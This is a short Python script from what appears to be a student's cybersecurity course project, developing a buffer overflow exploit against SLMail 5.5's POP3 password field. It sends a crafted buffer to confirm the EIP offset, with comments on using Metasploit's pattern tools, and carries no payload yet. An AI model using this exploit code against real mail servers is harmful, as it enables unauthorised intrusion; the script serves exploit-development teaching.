# Programming For Cybersecurity course - Project
# Subject: Development of a buffer overflow exploit based on a proof of concept exploit.
#
# Author: Tomasz
#
#  Take the hex value and identify the offset of where EIP register resides
#  Again, Kali linus can help us: "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4000 -q 39694438"  (where is the hex value)
#  Re-run the code to make sure that your offset is calculated properly and B's fill in the EIP register
#  

import sys
import socket

try:
    #Buffer to be sent towards the target 
    #buffer = 'A' * 4000
    
    # Kali Linux command - "msf-pattern_create -l 4000"
    
    offset = 2606       # offset to feel the buffer before eip
    eip  = 'B' * 4 
    buffer = 'A' * offset + eip + 'C' * (4000 - 2606 - 4)   # buffer + eip + badchars
 
    TARGET = '192.168.100.1' 
    PORT = 110
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))
    data = s.recv(1024)
    
    s.send('USER username'+'\r\n')                  # Send Username
    data = s.recv(1024)
    
    s.send('PASS ' + buffer + '\r\n')             # Send Password and buffer
    s.close()
except:
    print('There was a problem... please check if the server is vulnerable and SLMail 5.5 is running on the target.')